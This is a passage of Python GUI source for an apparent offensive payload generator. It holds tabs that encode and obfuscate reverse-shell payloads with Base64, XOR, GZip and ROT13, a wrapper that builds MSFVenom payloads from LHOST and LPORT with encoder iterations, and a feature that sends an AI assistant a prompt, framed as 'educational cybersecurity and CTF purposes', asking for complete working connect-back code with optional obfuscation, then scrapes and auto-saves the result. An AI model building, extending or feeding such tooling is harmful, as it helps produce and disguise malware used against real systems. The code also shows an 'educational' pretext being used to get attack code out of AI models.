        return tab
    
    def _build_encode_tab(self):
        """Tab ENCODE - khusus encode saja"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setSpacing(10)
        layout.setContentsMargins(5, 5, 5, 5)
        
        # Input
        input_label = QLabel("📥 Plain Text Payload:")
        input_label.setStyleSheet("color: #cccccc; font-weight: bold; font-size: 11px; padding: 2px 0;")
        layout.addWidget(input_label)
        
        self.encode_input = QTextEdit()
        self.encode_input.setPlaceholderText(
            "Paste plain text payload to encode...\n\n"
            "Example:\n"
            "import socket,os,pty;s=socket.socket();..."
        )
        self.encode_input.setMinimumHeight(120)
        self.encode_input.setStyleSheet(self._textarea_style())
        layout.addWidget(self.encode_input)
        
        # Separator
        sep1 = QFrame()
        sep1.setFrameShape(QFrame.Shape.HLine)
        sep1.setStyleSheet("background-color: #333333; max-height: 1px;")
        layout.addWidget(sep1)
        
        # Options
        opt_widget = QWidget()
        opt_layout = QHBoxLayout(opt_widget)
        opt_layout.setContentsMargins(0, 5, 0, 5)
        opt_layout.setSpacing(12)
        
        opt_layout.addWidget(QLabel("Method:"))
        self.encode_method = QComboBox()
        self.encode_method.addItem("Base64", "base64")
        self.encode_method.addItem("Hex", "hex")
        self.encode_method.addItem("URL", "url")
        self.encode_method.addItem("ROT13", "rot13")
        self.encode_method.addItem("Base64 + GZip", "base64_gzip")
        self.encode_method.addItem("Base64 + XOR", "base64_xor")
        self.encode_method.addItem("Base64 + ROT13", "base64_rot13")
        self.encode_method.setMinimumWidth(180)
        self.encode_method.setStyleSheet(self._combo_style())
        opt_layout.addWidget(self.encode_method)
        
        opt_layout.addSpacing(15)
        opt_layout.addWidget(QLabel("XOR Key:"))
        self.encode_xor_key = QLineEdit("0x55")
        self.encode_xor_key.setMaximumWidth(80)
        self.encode_xor_key.setStyleSheet(self._input_style())
        opt_layout.addWidget(self.encode_xor_key)
        
        opt_layout.addStretch()
        layout.addWidget(opt_widget)
        
        # Separator
        sep2 = QFrame()
        sep2.setFrameShape(QFrame.Shape.HLine)
        sep2.setStyleSheet("background-color: #333333; max-height: 1px;")
        layout.addWidget(sep2)
        
        # Encode button
        btn_widget = QWidget()
        btn_layout = QHBoxLayout(btn_widget)
        btn_layout.setContentsMargins(0, 5, 0, 5)
        btn_layout.setSpacing(15)
        
        self.encode_btn = QPushButton("🔒 Encode")
        self.encode_btn.clicked.connect(self._do_encode)
        self.encode_btn.setMinimumHeight(38)
        self.encode_btn.setFixedWidth(130)
        self.encode_btn.setStyleSheet(self._button_style("#238636", "#ffffff"))
        btn_layout.addWidget(self.encode_btn)
        
        self.encode_clear_btn = QPushButton("🗑 Clear")
        self.encode_clear_btn.clicked.connect(self.encode_input.clear)
        self.encode_clear_btn.setMinimumHeight(38)
        self.encode_clear_btn.setFixedWidth(100)
        self.encode_clear_btn.setStyleSheet(self._button_style("#555555", "#ffffff"))
        btn_layout.addWidget(self.encode_clear_btn)
        
        btn_layout.addStretch()
        layout.addWidget(btn_widget)
        
        # Separator
        sep3 = QFrame()
        sep3.setFrameShape(QFrame.Shape.HLine)
        sep3.setStyleSheet("background-color: #333333; max-height: 1px;")
        layout.addWidget(sep3)
        
        # Output
        output_label = QLabel("📤 Encoded Result:")
        output_label.setStyleSheet("color: #cccccc; font-weight: bold; font-size: 11px; padding: 2px 0;")
        layout.addWidget(output_label)
        
        self.encode_output = QTextEdit()
        self.encode_output.setReadOnly(True)
        self.encode_output.setMinimumHeight(150)
        self.encode_output.setStyleSheet(self._textarea_style())
        layout.addWidget(self.encode_output)
        
        # Separator
        sep4 = QFrame()
        sep4.setFrameShape(QFrame.Shape.HLine)
        sep4.setStyleSheet("background-color: #333333; max-height: 1px;")
        layout.addWidget(sep4)
        
        # Output buttons
        out_widget = QWidget()
        out_btn_layout = QHBoxLayout(out_widget)
        out_btn_layout.setContentsMargins(0, 5, 0, 5)
        out_btn_layout.setSpacing(15)
        
        copy_btn = QPushButton("📋 Copy")
        copy_btn.clicked.connect(self._copy_encode_output)
        copy_btn.setMinimumHeight(30)
        copy_btn.setFixedWidth(100)
        copy_btn.setStyleSheet(self._button_style("#1f6feb", "#ffffff"))
        out_btn_layout.addWidget(copy_btn)
        
        save_btn = QPushButton("💾 Save")
        save_btn.clicked.connect(self._save_encode_output)
        save_btn.setMinimumHeight(30)
        save_btn.setFixedWidth(100)
        save_btn.setStyleSheet(self._button_style("#238636", "#ffffff"))
        out_btn_layout.addWidget(save_btn)
        
        out_btn_layout.addStretch()
        layout.addWidget(out_widget)
        
        # Status
        self.encode_status = QLabel("🟢 Ready - Paste plain text to encode")
        self.encode_status.setStyleSheet("color: #50fa7b; font-size: 10px; padding: 6px 0;")
        layout.addWidget(self.encode_status)
        
        return tab
    
    def _build_decode_tab(self):
        """Tab DECODE - khusus decode saja"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setSpacing(10)
        layout.setContentsMargins(5, 5, 5, 5)
        
        # Input
        input_label = QLabel("📥 Encoded Payload:")
        input_label.setStyleSheet("color: #cccccc; font-weight: bold; font-size: 11px; padding: 2px 0;")
        layout.addWidget(input_label)
        
        self.decode_input = QTextEdit()
        self.decode_input.setPlaceholderText(
            "Paste encoded payload to decode...\n\n"
            "Examples:\n"
            "Base64: aW1wb3J0IHNvY2tldA==\n"
            "Hex: 696d706f727420736f636b6574\n"
            "URL: import%20socket"
        )
        self.decode_input.setMinimumHeight(120)
        self.decode_input.setStyleSheet(self._textarea_style())
        layout.addWidget(self.decode_input)
        
        # Separator
        sep1 = QFrame()
        sep1.setFrameShape(QFrame.Shape.HLine)
        sep1.setStyleSheet("background-color: #333333; max-height: 1px;")
        layout.addWidget(sep1)
        
        # Options
        opt_widget = QWidget()
        opt_layout = QHBoxLayout(opt_widget)
        opt_layout.setContentsMargins(0, 5, 0, 5)
        opt_layout.setSpacing(12)
        
        opt_layout.addWidget(QLabel("Method:"))
        self.decode_method = QComboBox()
        self.decode_method.addItem("Base64", "base64")
        self.decode_method.addItem("Hex", "hex")
        self.decode_method.addItem("URL", "url")
        self.decode_method.addItem("ROT13", "rot13")
        self.decode_method.addItem("Base64 + GZip", "base64_gzip")
        self.decode_method.addItem("Base64 + XOR", "base64_xor")
        self.decode_method.addItem("Base64 + ROT13", "base64_rot13")
        self.decode_method.addItem("Multiple Layers", "multiple")
        self.decode_method.setMinimumWidth(180)
        self.decode_method.setStyleSheet(self._combo_style())
        opt_layout.addWidget(self.decode_method)
        
        opt_layout.addSpacing(15)
        opt_layout.addWidget(QLabel("XOR Key:"))
        self.decode_xor_key = QLineEdit("0x55")
        self.decode_xor_key.setMaximumWidth(80)
        self.decode_xor_key.setStyleSheet(self._input_style())
        opt_layout.addWidget(self.decode_xor_key)
        
        opt_layout.addStretch()
        
        self.auto_detect_btn = QPushButton("🔍 Auto-Detect")
        self.auto_detect_btn.setFixedHeight(30)
        self.auto_detect_btn.setFixedWidth(130)
        self.auto_detect_btn.clicked.connect(self._do_auto_detect)
        self.auto_detect_btn.setStyleSheet(self._button_style("#1f6feb", "#ffffff"))
        opt_layout.addWidget(self.auto_detect_btn)
        
        layout.addWidget(opt_widget)
        
        # Separator
        sep2 = QFrame()
        sep2.setFrameShape(QFrame.Shape.HLine)
        sep2.setStyleSheet("background-color: #333333; max-height: 1px;")
        layout.addWidget(sep2)
        
        # Decode button
        btn_widget = QWidget()
        btn_layout = QHBoxLayout(btn_widget)
        btn_layout.setContentsMargins(0, 5, 0, 5)
        btn_layout.setSpacing(15)
        
        self.decode_btn = QPushButton("🔓 Decode")
        self.decode_btn.clicked.connect(self._do_decode)
        self.decode_btn.setMinimumHeight(38)
        self.decode_btn.setFixedWidth(130)
        self.decode_btn.setStyleSheet(self._button_style("#da3633", "#ffffff"))
        btn_layout.addWidget(self.decode_btn)
        
        self.decode_clear_btn = QPushButton("🗑 Clear")
        self.decode_clear_btn.clicked.connect(self.decode_input.clear)
        self.decode_clear_btn.setMinimumHeight(38)
        self.decode_clear_btn.setFixedWidth(100)
        self.decode_clear_btn.setStyleSheet(self._button_style("#555555", "#ffffff"))
        btn_layout.addWidget(self.decode_clear_btn)
        
        btn_layout.addStretch()
        layout.addWidget(btn_widget)
        
        # Separator
        sep3 = QFrame()
        sep3.setFrameShape(QFrame.Shape.HLine)
        sep3.setStyleSheet("background-color: #333333; max-height: 1px;")
        layout.addWidget(sep3)
        
        # Output
        output_label = QLabel("📤 Decoded Result:")
        output_label.setStyleSheet("color: #cccccc; font-weight: bold; font-size: 11px; padding: 2px 0;")
        layout.addWidget(output_label)
        
        self.decode_output = QTextEdit()
        self.decode_output.setReadOnly(True)
        self.decode_output.setMinimumHeight(150)
        self.decode_output.setStyleSheet(self._textarea_style())
        layout.addWidget(self.decode_output)
        
        # Separator
        sep4 = QFrame()
        sep4.setFrameShape(QFrame.Shape.HLine)
        sep4.setStyleSheet("background-color: #333333; max-height: 1px;")
        layout.addWidget(sep4)
        
        # Output buttons
        out_widget = QWidget()
        out_btn_layout = QHBoxLayout(out_widget)
        out_btn_layout.setContentsMargins(0, 5, 0, 5)
        out_btn_layout.setSpacing(15)
        
        copy_btn = QPushButton("📋 Copy")
        copy_btn.clicked.connect(self._copy_decode_output)
        copy_btn.setMinimumHeight(30)
        copy_btn.setFixedWidth(100)
        copy_btn.setStyleSheet(self._button_style("#1f6feb", "#ffffff"))
        out_btn_layout.addWidget(copy_btn)
        
        save_btn = QPushButton("💾 Save")
        save_btn.clicked.connect(self._save_decode_output)
        save_btn.setMinimumHeight(30)
        save_btn.setFixedWidth(100)
        save_btn.setStyleSheet(self._button_style("#238636", "#ffffff"))
        out_btn_layout.addWidget(save_btn)
        
        out_btn_layout.addStretch()
        layout.addWidget(out_widget)
        
        # Status
        self.decode_status = QLabel("🟢 Ready - Paste encoded payload to decode")
        self.decode_status.setStyleSheet("color: #50fa7b; font-size: 10px; padding: 6px 0;")
        layout.addWidget(self.decode_status)
        
        return tab
    
    # ═══════════════════════════════════════════════════════════════════════════
    # ENCODE METHODS
    # ═══════════════════════════════════════════════════════════════════════════
    
    def _do_encode(self):
        """Encode payload"""
        data = self.encode_input.toPlainText().strip()
        if not data:
            QMessageBox.warning(self, "Warning", "Please paste plain text payload first!")
            return
        
        method = self.encode_method.currentData()
        xor_key = 0x55
        
        if method == "base64_xor":
            try:
                key_text = self.encode_xor_key.text().strip()
                if key_text.startswith('0x'):
                    xor_key = int(key_text, 16)
                else:
                    xor_key = int(key_text)
            except:
                xor_key = 0x55
        
        encoder_map = {
            "base64": PayloadEncoder.encode_base64,
            "hex": PayloadEncoder.encode_hex,
            "url": PayloadEncoder.encode_url,
            "rot13": PayloadEncoder.encode_rot13,
            "base64_gzip": PayloadEncoder.encode_base64_gzip,
            "base64_xor": lambda d: PayloadEncoder.encode_base64_xor(d, xor_key),
            "base64_rot13": PayloadEncoder.encode_base64_rot13,
        }
        
        if method in encoder_map:
            try:
                result = encoder_map[method](data)
                self.encode_output.setPlainText(result)
                self.encode_status.setText("✅ Encoded successfully!")
                self.encode_status.setStyleSheet("color: #50fa7b; font-size: 10px; padding: 6px 0;")
                self.current_output = result
            except Exception as e:
                self.encode_output.setPlainText(f"[ERROR] Encode failed: {e}")
                self.encode_status.setText("❌ Encode failed")
                self.encode_status.setStyleSheet("color: #ff5555; font-size: 10px; padding: 6px 0;")
    
    def _copy_encode_output(self):
        text = self.encode_output.toPlainText()
        if text:
            QApplication.clipboard().setText(text)
            self.encode_status.setText("📋 Copied!")
            self.encode_status.setStyleSheet("color: #00ffff; font-size: 10px; padding: 6px 0;")
    
    def _save_encode_output(self):
        text = self.encode_output.toPlainText()
        if not text:
            return
        filepath, _ = QFileDialog.getSaveFileName(
            self, "Save Encoded Output",
            str(Path.home() / "encoded_payload.txt"),
            "Text Files (*.txt);;All Files (*.*)"
        )
        if filepath:
            try:
                with open(filepath, 'w') as f:
                    f.write(text)
                self.encode_status.setText(f"💾 Saved: {os.path.basename(filepath)}")
                self.encode_status.setStyleSheet("color: #50fa7b; font-size: 10px; padding: 6px 0;")
            except Exception as e:
                self.encode_status.setText(f"❌ Save error: {e}")
                self.encode_status.setStyleSheet("color: #ff5555; font-size: 10px; padding: 6px 0;")
    
    # ═══════════════════════════════════════════════════════════════════════════
    # DECODE METHODS
    # ═══════════════════════════════════════════════════════════════════════════
    
    def _do_decode(self):
        """Decode payload"""
        data = self.decode_input.toPlainText().strip()
        if not data:
            QMessageBox.warning(self, "Warning", "Please paste encoded payload first!")
            return
        
        method = self.decode_method.currentData()
        xor_key = 0x55
        
        if method == "base64_xor":
            try:
                key_text = self.decode_xor_key.text().strip()
                if key_text.startswith('0x'):
                    xor_key = int(key_text, 16)
                else:
                    xor_key = int(key_text)
            except:
                xor_key = 0x55
        
        decoder_map = {
            "base64": PayloadDecoder.decode_base64,
            "hex": PayloadDecoder.decode_hex,
            "url": PayloadDecoder.decode_url,
            "rot13": PayloadDecoder.decode_rot13,
            "base64_gzip": PayloadDecoder.decode_base64_gzip,
            "base64_xor": lambda d: PayloadDecoder.decode_base64_xor(d, xor_key),
            "base64_rot13": PayloadDecoder.decode_base64_rot13,
            "multiple": PayloadDecoder.decode_multiple,
        }
        
        if method in decoder_map:
            try:
                result = decoder_map[method](data)
                self.decode_output.setPlainText(result)
                if result.startswith("[ERROR]"):
                    self.decode_status.setText("⚠️ Decode error")
                    self.decode_status.setStyleSheet("color: #ffff00; font-size: 10px; padding: 6px 0;")
                else:
                    self.decode_status.setText("✅ Decoded successfully!")
                    self.decode_status.setStyleSheet("color: #50fa7b; font-size: 10px; padding: 6px 0;")
                    if len(result) > 50 and any(kw in result for kw in ['import', 'socket', 'exec', 'eval']):
                        self.current_output = result
            except Exception as e:
                self.decode_output.setPlainText(f"[ERROR] Decode failed: {e}")
                self.decode_status.setText("❌ Decode failed")
                self.decode_status.setStyleSheet("color: #ff5555; font-size: 10px; padding: 6px 0;")
    
    def _do_auto_detect(self):
        """Auto-detect encoding"""
        data = self.decode_input.toPlainText().strip()
        if not data:
            QMessageBox.warning(self, "Warning", "Please paste encoded payload first!")
            return
        
        detections = PayloadDecoder.detect_encoding(data)
        
        if not detections:
            self.decode_output.setPlainText("No encoding detected. Raw data:\n\n" + data[:500])
            self.decode_status.setText("⚠️ No encoding detected")
            self.decode_status.setStyleSheet("color: #ffff00; font-size: 10px; padding: 6px 0;")
            return
        
        result = "🔍 ENCODING DETECTION RESULTS\n" + "="*40 + "\n\n"
        for enc, info in detections.items():
            conf = info.get('confidence', 0) * 100
            result += f"  • {enc.upper()}: {conf:.0f}% confidence\n"
            result += f"    {info.get('description', '')}\n"
        
        best = max(detections.items(), key=lambda x: x[1].get('confidence', 0))
        if best:
            result += f"\n✅ Best match: {best[0].upper()}"
            index = self.decode_method.findData(best[0])
            if index >= 0:
                self.decode_method.setCurrentIndex(index)
        
        self.decode_output.setPlainText(result)
        self.decode_status.setText("🔍 Detection complete")
        self.decode_status.setStyleSheet("color: #00ffff; font-size: 10px; padding: 6px 0;")
    
    def _copy_decode_output(self):
        text = self.decode_output.toPlainText()
        if text:
            QApplication.clipboard().setText(text)
            self.decode_status.setText("📋 Copied!")
            self.decode_status.setStyleSheet("color: #00ffff; font-size: 10px; padding: 6px 0;")
    
    def _save_decode_output(self):
        text = self.decode_output.toPlainText()
        if not text:
            return
        filepath, _ = QFileDialog.getSaveFileName(
            self, "Save Decoded Output",
            str(Path.home() / "decoded_payload.txt"),
            "Text Files (*.txt);;All Files (*.*)"
        )
        if filepath:
            try:
                with open(filepath, 'w') as f:
                    f.write(text)
                self.decode_status.setText(f"💾 Saved: {os.path.basename(filepath)}")
                self.decode_status.setStyleSheet("color: #50fa7b; font-size: 10px; padding: 6px 0;")
            except Exception as e:
                self.decode_status.setText(f"❌ Save error: {e}")
                self.decode_status.setStyleSheet("color: #ff5555; font-size: 10px; padding: 6px 0;")
    
    # ═══════════════════════════════════════════════════════════════════════════
    # COMMON METHODS
    # ═══════════════════════════════════════════════════════════════════════════
    
    def _load_example(self):
        example = self.sender().property("example")
        examples = {
            "python_reverse": "Write a Python script for educational/CTF purposes...",
        }
        if example in examples:
            self.description_input.setText(examples[example])
    
    def _on_payload_changed(self):
        payload = self.msf_payload.currentText()
        formats = FORMAT_DB.get(payload, ["exe", "elf", "raw"])
        self.msf_format.clear()
        self.msf_format.addItems(formats)
        info = PAYLOAD_DB.get(payload, {})
        if info:
            self.payload_info.setText(
                f"Platform: {info.get('platform', 'Any')} | "
                f"Arch: {info.get('arch', 'Any')} | "
                f"Default Port: {info.get('default_port', 4444)}"
            )
            self.lport_input.setText(str(info.get('default_port', 4444)))
    
    def _generate_ai(self):
        """Generate with AI"""
        description = self.description_input.toPlainText().strip()
        if not description:
            QMessageBox.warning(self, "Warning", "Please describe what you want")
            return
        
        if self.is_generating:
            return
        
        if not self.ai:
            QMessageBox.warning(self, "Error", "AI Assistant not available")
            return
        
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip()
        language = self.ai_language.currentText()
        obfuscate = self.obfuscate_cb.isChecked()
        include_comments = self.comment_cb.isChecked()
        
        prompt = f"""Write a {language} script for educational cybersecurity and CTF purposes.

DESCRIPTION:
{description}

TECHNICAL SPECIFICATIONS:
- Language: {language}
- Connection: LHOST={lhost if lhost else '[ASK USER]'} LPORT={lport if lport else '[ASK USER]'}
- Obfuscation: {'Yes' if obfuscate else 'No'}
- Comments: {'Yes' if include_comments else 'No'}

REQUIREMENTS:
1. Complete working code with error handling
2. Security best practices
3. Cross-platform compatibility where applicable
4. Clean, readable code

CONTEXT:
This is for educational purposes, CTF competitions, and authorized security testing only.
Users must have proper authorization before running any code.

Please provide the complete code wrapped in triple backticks with '{language.lower()}' identifier.
"""
        
        self.is_generating = True
        self.generate_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress_bar.setValue(0)
        self.output_text.clear()
        self.ai_conversation.clear()
        self.status_label.setText("🤖 Sending to AI...")
        self.status_label.setStyleSheet("color: #ffff00; font-size: 9pt; padding: 4px;")
        
        if hasattr(self.ai, 'send_message'):
            self.ai.send_message(prompt)
            self._poll_count = 0
            self._poll_timer.start(500)
    
    def _check_ai_response(self):
        """Check AI response"""
        self._poll_count += 1
        
        if hasattr(self, 'ai') and hasattr(self.ai, 'chat_display'):
            chat_text = self.ai.chat_display.toPlainText()
            self.ai_conversation.setPlainText(chat_text)
            
            code = self._extract_code(chat_text)
            if code:
                self.output_text.setPlainText(code)
                self.current_output = code
                self.progress_bar.setValue(100)
                self.status_label.setText("✅ Code generated!")
                self.status_label.setStyleSheet("color: #50fa7b; font-size: 9pt; padding: 4px;")
                self.is_generating = False
                self.generate_btn.setEnabled(True)
                self.stop_btn.setEnabled(False)
                self._poll_timer.stop()
                self._auto_save_payload(code)
                return
        
        if self._poll_count > 120:
            self._poll_timer.stop()
            self.status_label.setText("⏰ Timeout waiting for AI")
            self.status_label.setStyleSheet("color: #f1fa8c; font-size: 9pt; padding: 4px;")
            self.is_generating = False
            self.generate_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.progress_bar.setValue(0)
    
    def _extract_code(self, text):
        """Extract code from AI response"""
        pattern = r'```(?:\w+)?\s*\n(.*?)\n```'
        matches = re.findall(pattern, text, re.DOTALL)
        if matches:
            return '\n\n'.join(matches)
        code_keywords = ['import ', 'def ', 'class ', 'function ', '<?php', '#!/bin', 'package main', 'fn main']
        if any(kw in text for kw in code_keywords):
            return text
        return None
    
    def _generate_msfvenom(self):
        if not self.msfvenom_available:
            QMessageBox.warning(self, "MSFVenom Not Available", "MSFVenom not installed.")
            return
        lhost = self.lhost_input.text().strip()
        if not lhost:
            QMessageBox.warning(self, "Warning", "Please enter LHOST")
            return
        if self.is_generating:
            return
        
        payload = self.msf_payload.currentText()
        format_type = self.msf_format.currentText()
        encoder = self.msf_encoder.currentText()
        iterations = self.msf_iterations.value()
        lport = self.lport_input.text().strip() or "4444"
        
        self.is_generating = True
        self.generate_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress_bar.setValue(0)
        self.output_text.clear()
        self.status_label.setText("🔨 Building payload...")
        self.status_label.setStyleSheet("color: #ffff00; font-size: 9pt; padding: 4px;")
        
        self.msf_worker = MSFVenomWorker(payload, format_type, lhost, lport, encoder, iterations)
        self.msf_worker.output.connect(self._append_output)
        self.msf_worker.progress.connect(self.progress_bar.setValue)
        self.msf_worker.finished.connect(self._on_msf_finished)
        self.msf_worker.start()
    
    def _append_output(self, text):
        self.output_text.append(text)
        scrollbar = self.output_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
    
    def _on_msf_finished(self, success, message, output_path):
        self.is_generating = False
        self.generate_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        if success:
            self.status_label.setText(f"✅ {message}")
            self.status_label.setStyleSheet("color: #50fa7b; font-size: 9pt; padding: 4px;")
            self.current_output = output_path
            reply = QMessageBox.information(
                self, "Success", f"Payload generated!\n\n{output_path}\n\nOpen folder?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
            )
            if reply == QMessageBox.StandardButton.Yes:
                self._open_output_folder()
        else:
            self.status_label.setText(f"❌ {message}")
            self.status_label.setStyleSheet("color: #ff5555; font-size: 9pt; padding: 4px;")
    
    def _generate(self):
        if self.mode_tabs.currentIndex() == 0:
            self._generate_ai()
        elif self.mode_tabs.currentIndex() == 1:
            self._generate_msfvenom()
    
    def _stop_generation(self):
        if self.msf_worker and self.msf_worker.isRunning():
            self.msf_worker.stop()
            self.msf_worker.quit()
            self.msf_worker.wait(2000)
        self._poll_timer.stop()
        self.is_generating = False
        self.generate_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_label.setText("⏹️ Stopped")
        self.status_label.setStyleSheet("color: #ff5555; font-size: 9pt; padding: 4px;")
    
    def _copy_output(self):
        text = self.output_text.toPlainText()
        if text:
            QApplication.clipboard().setText(text)
            self.status_label.setText("📋 Copied!")
            self.status_label.setStyleSheet("color: #00ffff; font-size: 9pt; padding: 4px;")
    
    def _save_output(self):
        text = self.output_text.toPlainText()
        if not text:
            return
        lang = self.ai_language.currentText() if hasattr(self, 'ai_language') else "py"
        ext_map = {"Python": "py", "Bash": "sh", "PowerShell": "ps1", "PHP": "php"}
        ext = ext_map.get(lang, "txt")
        filepath, _ = QFileDialog.getSaveFileName(
            self, "Save Payload",
            str(Path.home() / f"payload.{ext}"),
            f"* * ({ext});;All Files (*.*)"
        )
        if filepath:
            try:
                with open(filepath, 'w') as f:
                    f.write(text)
                self.status_label.setText(f"✅ Saved: {filepath}")
                self.status_label.setStyleSheet("color: #50fa7b; font-size: 9pt; padding: 4px;")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save: {e}")
    
    def _open_output_folder(self):
        folders = [Path.home() / "msfvenom_payloads", Path.home() / "custom_payloads", Path.home() / "payloads"]
        for folder in folders:
            if folder.exists():
                if os.name == 'nt':
                    os.startfile(folder)
                else:
                    subprocess.Popen(['xdg-open', str(folder)])
                return
        default = Path.home() / "payloads"
        default.mkdir(parents=True, exist_ok=True)
        if os.name == 'nt':
            os.startfile(default)
        else:
            subprocess.Popen(['xdg-open', str(default)])
    
    def _auto_save_payload(self, code):
        try:
            lang = self.ai_language.currentText()
            ext_map = {
                "Python": "py", "Bash": "sh", "PowerShell": "ps1",
                "PHP": "php", "Perl": "pl", "Ruby": "rb",
                "Go": "go", "C": "c", "C++": "cpp",
                "JavaScript/Node.js": "js", "Java": "java",
                "Rust": "rs", "Auto-detect": "txt"
            }
            ext = ext_map.get(lang, "txt")
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"ai_payload_{timestamp}.{ext}"
            output_dir = Path.home() / "custom_payloads"
            output_dir.mkdir(parents=True, exist_ok=True)
            filepath = output_dir / filename
            with open(filepath, 'w') as f:
                f.write(code)
            self.status_label.setText(f"📁 Auto-saved: {filepath}")
        except Exception as e:
            print(f"Auto-save error: {e}")
    
    def _run_code(self):
        QMessageBox.information(self, "Run", "Run feature")
    
    # ═══════════════════════════════════════════════════════════════════════════
    # STYLING
    # ═══════════════════════════════════════════════════════════════════════════
    
    @staticmethod
    def _group_style(color="#00ff00"):
        return f"""
            QGroupBox {{
                color: {color};
                border: 1px solid #333333;
                border-radius: 4px;
                margin-top: 8px;
                padding-top: 12px;
                font-weight: bold;
                font-size: 10pt;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 10px;
                color: {color};
            }}
        """
    
    @staticmethod
    def _combo_style():
        return """
            QComboBox {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                padding: 6px 10px;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
                min-height: 30px;
            }
            QComboBox:hover { border-color: #007acc; }
            QComboBox::drop-down { border: none; }
        """
    
    @staticmethod
    def _input_style():
        return """
            QLineEdit, QSpinBox {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                padding: 6px 10px;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
                min-height: 30px;
            }
            QLineEdit:focus, QSpinBox:focus { border-color: #007acc; }
        """
    
    @staticmethod
    def _textarea_style():
        return """
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                padding: 8px;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
            }
            QTextEdit:focus { border-color: #007acc; }
        """
    
    @staticmethod
    def _button_style(bg="#00ff00", fg="#000000"):
        return f"""
            QPushButton {{
                background: {bg};
                color: {fg};
                border: none;
                border-radius: 4px;
                padding: 8px 16px;
                font-weight: bold;
                font-size: 10pt;
                min-width: 80px;
            }}
            QPushButton:hover {{ background: {bg}dd; }}
            QPushButton:pressed {{ background: {bg}99; }}
            QPushButton:disabled {{
                background: #555555;
                color: #999999;
            }}
        """
    
    @staticmethod
    def _progress_style():
        return """
            QProgressBar {
                border: 1px solid #30363d;
                border-radius: 4px;
                background: #0d1117;
                text-align: center;
                color: #fff;
                height: 24px;
                font-weight: bold;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                                           stop:0 #ff0000, stop:0.5 #ff6600, stop:1 #00ff00);
                border-radius: 3px;
            }
        """
    
    def closeEvent(self, event):
        self._stop_generation()
        event.accept()